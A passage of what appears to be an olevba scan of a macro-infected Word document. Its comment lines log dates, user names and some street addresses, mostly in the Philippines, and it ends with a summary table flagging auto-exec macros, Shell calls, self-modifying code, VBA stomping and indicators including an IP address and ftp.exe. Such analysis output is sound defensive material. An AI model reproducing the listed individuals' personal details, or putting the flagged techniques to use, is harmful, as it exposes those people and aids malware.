+' 	QuoteRem 0x0000 0x0009 " TCS User"
+' Line #1288:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1289:
+' Line #1290:
+' Line #1291:
+' Line #1292:
+' 	QuoteRem 0x0000 0x0022 " 09:04:19 AM - Monday, 20 Mar 2000"
+' Line #1293:
+' 	QuoteRem 0x0000 0x0009 " nawright"
+' Line #1294:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1295:
+' Line #1296:
+' Line #1297:
+' Line #1298:
+' 	QuoteRem 0x0000 0x0022 " 03:19:56 PM - Monday, 27 Mar 2000"
+' Line #1299:
+' 	QuoteRem 0x0000 0x000A " ekassembe"
+' Line #1300:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1301:
+' Line #1302:
+' Line #1303:
+' Line #1304:
+' 	QuoteRem 0x0000 0x0025 " 03:18:04 PM - Wednesday, 29 Mar 2000"
+' Line #1305:
+' 	QuoteRem 0x0000 0x000B " kpresterud"
+' Line #1306:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1307:
+' Line #1308:
+' Line #1309:
+' Line #1310:
+' 	QuoteRem 0x0000 0x0021 " 02:35:20  - Saturday, 1 Apr 2000"
+' Line #1311:
+' 	QuoteRem 0x0000 0x0006 " aisse"
+' Line #1312:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1313:
+' Line #1314:
+' Line #1315:
+' Line #1316:
+' 	QuoteRem 0x0000 0x0022 " 11:39:03 AM - Tuesday, 4 Apr 2000"
+' Line #1317:
+' 	QuoteRem 0x0000 0x0008 " rsilcox"
+' Line #1318:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1319:
+' Line #1320:
+' Line #1321:
+' Line #1322:
+' 	QuoteRem 0x0000 0x0022 " 02:16:12 PM - Tuesday, 4 Apr 2000"
+' Line #1323:
+' 	QuoteRem 0x0000 0x0008 " rsilcox"
+' Line #1324:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1325:
+' Line #1326:
+' Line #1327:
+' Line #1328:
+' 	QuoteRem 0x0000 0x0025 " 01:49:55 PM - Wednesday, 12 Apr 2000"
+' Line #1329:
+' 	QuoteRem 0x0000 0x0005 " Alex"
+' Line #1330:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1331:
+' Line #1332:
+' Line #1333:
+' Line #1334:
+' 	QuoteRem 0x0000 0x0024 " 09:51:01 AM - Thursday, 20 Apr 2000"
+' Line #1335:
+' 	QuoteRem 0x0000 0x0008 " OPEY A."
+' Line #1336:
+' 	QuoteRem 0x0000 0x000F " Abraham Montes"
+' Line #1337:
+' 	QuoteRem 0x0000 0x000E " Brgy. Captain"
+' Line #1338:
+' 	QuoteRem 0x0000 0x0021 " Brgy. Bulata, Cauayan, Neg. Occ."
+' Line #1339:
+' Line #1340:
+' Line #1341:
+' Line #1342:
+' 	QuoteRem 0x0000 0x0023 " 12:12:54 PM - Thursday, 4 May 2000"
+' Line #1343:
+' 	QuoteRem 0x0000 0x0013 " Pamela Coscolluela"
+' Line #1344:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1345:
+' Line #1346:
+' Line #1347:
+' Line #1348:
+' 	QuoteRem 0x0000 0x0023 " 09:54:43 AM - Saturday, 3 Jun 2000"
+' Line #1349:
+' 	QuoteRem 0x0000 0x000A " Computer5"
+' Line #1350:
+' 	QuoteRem 0x0000 0x000D " VAN Y NGUYEN"
+' Line #1351:
+' 	QuoteRem 0x0000 0x0040 " 201 RIZAL  AVE. PUERTO PRINCESA CITY, PALAWAN 5300, PHILIPPINES"
+' Line #1352:
+' Line #1353:
+' Line #1354:
+' Line #1355:
+' 	QuoteRem 0x0000 0x0025 " 08:29:39 AM - Wednesday, 14 Jun 2000"
+' Line #1356:
+' 	QuoteRem 0x0000 0x0005 " UNDP"
+' Line #1357:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1358:
+' Line #1359:
+' Line #1360:
+' Line #1361:
+' 	QuoteRem 0x0000 0x0022 " 12:17:36 PM - Friday, 16 Jun 2000"
+' Line #1362:
+' 	QuoteRem 0x0000 0x0006 " PCSDS"
+' Line #1363:
+' 	QuoteRem 0x0000 0x0032 " Palawna Council for Sustainable Development Staff"
+' Line #1364:
+' 	QuoteRem 0x0000 0x0023 " PAC, Irawan, Puerto Princesa City,"
+' Line #1365:
+' 	QuoteRem 0x0000 0x000E " 5300, Palawan"
+' Line #1366:
+' Line #1367:
+' Line #1368:
+' Line #1369:
+' 	QuoteRem 0x0000 0x0023 " 10:51:39 AM - Tuesday, 25 Jul 2000"
+' Line #1370:
+' 	QuoteRem 0x0000 0x0006 " PCSDS"
+' Line #1371:
+' 	QuoteRem 0x0000 0x001C " Mr. Abraham Kahlil B. Mitra"
+' Line #1372:
+' Line #1373:
+' Line #1374:
+' Line #1375:
+' 	QuoteRem 0x0000 0x0024 " 07:16:15 AM - Thursday, 31 Aug 2000"
+' Line #1376:
+' 	QuoteRem 0x0000 0x0006 " PCSDS"
+' Line #1377:
+' 	QuoteRem 0x0000 0x001C " Mr. Abraham Kahlil B. Mitra"
+' Line #1378:
+' Line #1379:
+' Line #1380:
+' Line #1381:
+' 	QuoteRem 0x0000 0x0023 " 08:50:07 AM - Tuesday, 21 Nov 2000"
+' Line #1382:
+' 	QuoteRem 0x0000 0x0006 " PCSDS"
+' Line #1383:
+' 	QuoteRem 0x0000 0x001C " Mr. Abraham Kahlil B. Mitra"
+' Line #1384:
+' Line #1385:
+' Line #1386:
+' Line #1387:
+' 	QuoteRem 0x0000 0x0025 " 09:22:05 AM - Wednesday, 22 Nov 2000"
+' Line #1388:
+' 	QuoteRem 0x0000 0x0006 " PCSDS"
+' Line #1389:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1390:
+' Line #1391:
+' Line #1392:
+' Line #1393:
+' 	QuoteRem 0x0000 0x0021 " 10:25:11 AM - Monday, 4 Dec 2000"
+' Line #1394:
+' 	QuoteRem 0x0000 0x0005 " UNDP"
+' Line #1395:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1396:
+' Line #1397:
+' Line #1398:
+' Line #1399:
+' 	QuoteRem 0x0000 0x0023 " 12:32:31 PM - Thursday, 1 Feb 2001"
+' Line #1400:
+' 	QuoteRem 0x0000 0x0006 " FRAMP"
+' Line #1401:
+' 	QuoteRem 0x0000 0x0013 " Kristine F. Santos"
+' Line #1402:
+' 	QuoteRem 0x0000 0x0022 " 3060 Rose St., San Isidro Village"
+' Line #1403:
+' 	QuoteRem 0x0000 0x0018 " Anos, Los Baños, Laguna"
+' Line #1404:
+' 	QuoteRem 0x0000 0x0011 " 4030 PHILIPPINES"
+' Line #1405:
+' Line #1406:
+' Line #1407:
+' Line #1408:
+' 	QuoteRem 0x0000 0x0024 " 06:31:33 AM - Saturday, 10 Feb 2001"
+' Line #1409:
+' 	QuoteRem 0x0000 0x001A " Lualhati Q. Lachica-Aliño"
+' Line #1410:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1411:
+' Line #1412:
+' Line #1413:
+' Line #1414:
+' 	QuoteRem 0x0000 0x0022 " 10:32:45 PM - Monday, 19 Mar 2001"
+' Line #1415:
+' 	QuoteRem 0x0000 0x000C " Press Enter"
+' Line #1416:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1417:
+' Line #1418:
+' Line #1419:
+' Line #1420:
+' 	QuoteRem 0x0000 0x0025 " 09:30:17 AM - Wednesday, 21 Mar 2001"
+' Line #1421:
+' 	QuoteRem 0x0000 0x0008 " OPEY A."
+' Line #1422:
+' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
+' Line #1423:
+' Line #1424:
+' Line #1425:
+' Line #1426:
+' 	QuoteRem 0x0000 0x0022 " 12:31:57 PM - Tuesday, 3 Apr 2001"
+' Line #1427:
+' 	QuoteRem 0x0000 0x000D " COMECO Group"
+' Line #1428:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1429:
+' Line #1430:
+' Line #1431:
+' Line #1432:
+' 	QuoteRem 0x0000 0x0024 " 09:48:35 AM - Thursday, 31 May 2001"
+' Line #1433:
+' 	QuoteRem 0x0000 0x0010 " Valued Customer"
+' Line #1434:
+' 	QuoteRem 0x0000 0x0017 " Terence Paul U. Dacles"
+' Line #1435:
+' 	QuoteRem 0x0000 0x001D " Project Manager-PACE Project"
+' Line #1436:
+' 	QuoteRem 0x0000 0x0007 " PRRCFI"
+' Line #1437:
+' 	QuoteRem 0x0000 0x001F " Door3, Doña Ceferina III Bldg."
+' Line #1438:
+' 	QuoteRem 0x0000 0x0019 " Mandalagan, Bacolod City"
+' Line #1439:
+' Line #1440:
+' Line #1441:
+' Line #1442:
+' 	QuoteRem 0x0000 0x0024 " 12:41:47 PM - Saturday, 16 Jun 2001"
+' Line #1443:
+' 	QuoteRem 0x0000 0x0010 " Valued Customer"
+' Line #1444:
+' 	QuoteRem 0x0000 0x001B " Mr. Terence Paul U. Dacles"
+' Line #1445:
+' 	QuoteRem 0x0000 0x001D " Project Manager-PACE Project"
+' Line #1446:
+' 	QuoteRem 0x0000 0x0007 " PRRCFI"
+' Line #1447:
+' 	QuoteRem 0x0000 0x001F " Door3, Doña Ceferina III Bldg."
+' Line #1448:
+' 	QuoteRem 0x0000 0x0019 " Mandalagan, Bacolod City"
+' Line #1449:
+' Line #1450:
+' Line #1451:
+' 	FuncDefn (Private Sub Document_Open())
+' Line #1452:
+' Line #1453:
+' Line #1454:
+' Line #1455:
+' Line #1456:
+' 	EndSub 
+' Line #1457:
+' Line #1458:
+' 	QuoteRem 0x0000 0x0023 " 12:16:35  - Wednesday, 11 Jul 2001"
+' Line #1459:
+' 	QuoteRem 0x0000 0x000D " Andrew Smith"
+' Line #1460:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1461:
+' Line #1462:
+' Line #1463:
+' Line #1464:
+' 	QuoteRem 0x0000 0x0021 " 07:11:53  - Tuesday, 24 Jul 2001"
+' Line #1465:
+' 	QuoteRem 0x0000 0x000A " Alex Page"
+' Line #1466:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1467:
+' Line #1468:
+' Line #1469:
+' Line #1470:
+' 	QuoteRem 0x0000 0x0020 " 02:47:21  - Friday, 27 Jul 2001"
+' Line #1471:
+' 	QuoteRem 0x0000 0x000D " Andrew Smith"
+' Line #1472:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1473:
+' Line #1474:
+' Line #1475:
+' Line #1476:
+' 	QuoteRem 0x0000 0x0022 " 11:18:15  - Wednesday, 1 Aug 2001"
+' Line #1477:
+' 	QuoteRem 0x0000 0x000C " Pete Raines"
+' Line #1478:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1479:
+' Line #1480:
+' Line #1481:
+' Line #1482:
+' 	QuoteRem 0x0000 0x0023 " 04:52:48 PM - Thursday, 9 Aug 2001"
+' Line #1483:
+' 	QuoteRem 0x0000 0x000D " Craig Turner"
+' Line #1484:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1485:
+' Line #1486:
+' Line #1487:
+' Line #1488:
+' 	QuoteRem 0x0000 0x0024 " 03:29:00 PM - Thursday, 30 Aug 2001"
+' Line #1489:
+' 	QuoteRem 0x0000 0x0009 " Ditry PC"
+' Line #1490:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1491:
+' Line #1492:
+' Line #1493:
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |Document_Close      |Runs when the Word document is closed        |
+|AutoExec  |Document_New        |Runs when a new Word document is created     |
+|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
+|          |                    |opened                                       |
+|AutoExec  |Label1_Click        |Runs when the file is opened and ActiveX     |
+|          |                    |objects trigger events                       |
+|Suspicious|environment         |May read system environment variables        |
+|Suspicious|Open                |May open a file                              |
+|Suspicious|write               |May write to a file (if combined with Open)  |
+|Suspicious|put                 |May write to a file (if combined with Open)  |
+|Suspicious|Output              |May write to a file (if combined with Open)  |
+|Suspicious|Shell               |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|vbHide              |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|command             |May run PowerShell commands                  |
+|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
+|Suspicious|lib                 |May run code from a DLL                      |
+|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
+|          |                    |(use option --deobf to deobfuscate)          |
+|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
+|          |                    |(use option --deobf to deobfuscate)          |
+|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|system              |May run an executable file or a system       |
+|          |                    |command on a Mac (if combined with           |
+|          |                    |libc.dylib)                                  |
+|Suspicious|'\x08'              |May use special characters such as backspace |
+|          |                    |to obfuscate code when printed on the console|
+|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|IOC       |209.201.88.110      |IPv4 address                                 |
+|IOC       |ftp.exe             |Executable file name                         |
+|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
+|          |                    |code and P-code are different, this may have |
+|          |                    |been used to hide malicious code             |
++----------+--------------------+---------------------------------------------+
+VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues
+
